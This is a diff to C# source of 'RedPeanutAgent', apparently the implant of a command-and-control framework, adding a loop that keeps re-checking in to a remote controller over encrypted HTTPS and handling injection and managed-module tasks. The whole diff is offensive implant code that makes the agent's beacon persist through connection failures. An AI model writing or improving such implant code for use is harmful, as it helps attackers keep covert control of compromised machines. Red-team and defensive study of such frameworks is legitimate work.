@@ -123,6 +123,32 @@ namespace RedPeanutAgent
             Run();
         }
 
+        private void Reconnect(string agentid, byte[] aeskey, byte[] aesiv, string param, Core.Utility.CookiedWebClient wc)
+        {
+            bool connected = false;
+            while(!connected)
+            {
+                try
+                {
+                    string rpaddress = String.Format("https://{0}:{1}/{2}", host, port, pagepost[new Random().Next(pagepost.Length)]);
+
+                    if (this.pipe == null)
+                    {
+                        Core.Utility.SendCheckinHttp(agentid, aeskey, aesiv, rpaddress, param, wc);
+                        connected = true;
+                    }
+                }
+                catch (Exception)
+                {
+                    
+                }
+                //More delay here?
+                Thread.Sleep(rInt * 1000);
+            }
+
+            
+        }
+
         private NamedPipeClientStream CreatePipeClient(string pipename)
         {
             NamedPipeClientStream pipe;
@@ -272,9 +298,9 @@ namespace RedPeanutAgent
                                         Execution.CommandExecuter commandExecuter = new Execution.CommandExecuter(task, this);
                                         commandExecuter.ExecuteModuleManaged();
                                     }
-                                    catch (RedPeanutAgent.Core.Utility.EndOfLifeException)
+                                    catch (RedPeanutAgent.Core.Utility.EndOfLifeException e)
                                     {
-                                        throw new RedPeanutAgent.Core.Utility.EndOfLifeException();
+                                        throw e;
                                     }
                                     catch (Exception)
                                     {
@@ -283,10 +309,6 @@ namespace RedPeanutAgent
                                     break;
                                 case "managed":
                                     managed = task.InjectionManagedTask.Managed;
-                                    {
-                                        output = string.Format("[*] Pivot listener already exists");
-                                    }
-
                                     Execution.CommandExecuter commandManaged = new Execution.CommandExecuter(task, this);
                                     commandManaged.SendResponse(string.Format("[*] Agent now in {0} mode", managed == true ? "Managed" : "Unmanaged"));
                                     break;
@@ -355,11 +377,11 @@ namespace RedPeanutAgent
                 {
                     HttpWebResponse errorResponse = e.Response as HttpWebResponse;
                     if (errorResponse == null || errorResponse.StatusCode != HttpStatusCode.NotFound)
-                        return;
+                        Reconnect(agentid, aeskey,  aesiv, param, wc);
                 }
                 catch (Exception)
                 {
-                    return;
+                    Reconnect(agentid, aeskey, aesiv, param, wc);
                 }
 
                 Thread.Sleep(rInt * 1000);
